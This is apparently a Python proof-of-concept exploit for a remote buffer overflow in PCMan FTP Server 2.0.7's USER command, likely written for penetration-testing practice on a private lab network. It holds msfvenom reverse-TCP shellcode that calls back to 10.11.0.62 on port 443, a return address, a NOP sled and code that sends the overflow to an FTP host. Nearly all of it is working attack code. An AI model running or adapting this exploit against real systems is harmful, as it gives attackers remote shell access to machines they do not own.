#!/usr/bin/env python
#-*- coding: utf-8 -*-

# PCMan FTP Server 2.0.7 - Remote Buffer Overflow
# Based off code from exploit-db
#
# Developed by JMcPeters 3/1/2019
#
# This application has multiple vulnerabilities. This is a PoC for the 'USER' command BoF.
#
import socket

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.62 LPORT=443 -b '\x0a\x00\x0d' -f python -v shellcode

# Windows XP SP3 English => 0x7e429353 # push esp, ret
# I thought I found a JMP ESP in the application itself =\ guess I was tired.

ret = "\xdf\x6e\x88\x72"

shellcode =  ""
shellcode += "\xda\xd4\xd9\x74\x24\xf4\x5b\xba\x9e\xa2\xd6\xc4"
shellcode += "\x33\xc9\xb1\x52\x31\x53\x17\x03\x53\x17\x83\x5d"
shellcode += "\xa6\x34\x31\x9d\x4f\x3a\xba\x5d\x90\x5b\x32\xb8"
shellcode += "\xa1\x5b\x20\xc9\x92\x6b\x22\x9f\x1e\x07\x66\x0b"
shellcode += "\x94\x65\xaf\x3c\x1d\xc3\x89\x73\x9e\x78\xe9\x12"
shellcode += "\x1c\x83\x3e\xf4\x1d\x4c\x33\xf5\x5a\xb1\xbe\xa7"
shellcode += "\x33\xbd\x6d\x57\x37\x8b\xad\xdc\x0b\x1d\xb6\x01"
shellcode += "\xdb\x1c\x97\x94\x57\x47\x37\x17\xbb\xf3\x7e\x0f"
shellcode += "\xd8\x3e\xc8\xa4\x2a\xb4\xcb\x6c\x63\x35\x67\x51"
shellcode += "\x4b\xc4\x79\x96\x6c\x37\x0c\xee\x8e\xca\x17\x35"
shellcode += "\xec\x10\x9d\xad\x56\xd2\x05\x09\x66\x37\xd3\xda"
shellcode += "\x64\xfc\x97\x84\x68\x03\x7b\xbf\x95\x88\x7a\x6f"
shellcode += "\x1c\xca\x58\xab\x44\x88\xc1\xea\x20\x7f\xfd\xec"
shellcode += "\x8a\x20\x5b\x67\x26\x34\xd6\x2a\x2f\xf9\xdb\xd4"
shellcode += "\xaf\x95\x6c\xa7\x9d\x3a\xc7\x2f\xae\xb3\xc1\xa8"
shellcode += "\xd1\xe9\xb6\x26\x2c\x12\xc7\x6f\xeb\x46\x97\x07"
shellcode += "\xda\xe6\x7c\xd7\xe3\x32\xd2\x87\x4b\xed\x93\x77"
shellcode += "\x2c\x5d\x7c\x9d\xa3\x82\x9c\x9e\x69\xab\x37\x65"
shellcode += "\xfa\xde\xcc\x65\xc4\xb6\xd0\x65\x39\xfc\x5c\x83"
shellcode += "\x53\x12\x09\x1c\xcc\x8b\x10\xd6\x6d\x53\x8f\x93"
shellcode += "\xae\xdf\x3c\x64\x60\x28\x48\x76\x15\xd8\x07\x24"
shellcode += "\xb0\xe7\xbd\x40\x5e\x75\x5a\x90\x29\x66\xf5\xc7"
shellcode += "\x7e\x58\x0c\x8d\x92\xc3\xa6\xb3\x6e\x95\x81\x77"
shellcode += "\xb5\x66\x0f\x76\x38\xd2\x2b\x68\x84\xdb\x77\xdc"
shellcode += "\x58\x8a\x21\x8a\x1e\x64\x80\x64\xc9\xdb\x4a\xe0"
shellcode += "\x8c\x17\x4d\x76\x91\x7d\x3b\x96\x20\x28\x7a\xa9"
shellcode += "\x8d\xbc\x8a\xd2\xf3\x5c\x74\x09\xb0\x6d\x3f\x13"
shellcode += "\x91\xe5\xe6\xc6\xa3\x6b\x19\x3d\xe7\x95\x9a\xb7"
shellcode += "\x98\x61\x82\xb2\x9d\x2e\x04\x2f\xec\x3f\xe1\x4f"
shellcode += "\x43\x3f\x20"


padding = ('\x90' * 20 ) + shellcode

# Testing control of the EIP register
# buffer2 = ("A" * 2006) + ("B" * 4 ) + ( "C" * 351 )

buffer2 = ("A" * 2006) + ret + padding + '\x43'*(749-len(padding))


print "Sending Buffer"

s = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
connect = s.connect(('10.11.13.39', 21))
s.recv(1024)
s.send('USER ' + buffer2 + '\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('PORT' + '\r\n')
s.close()
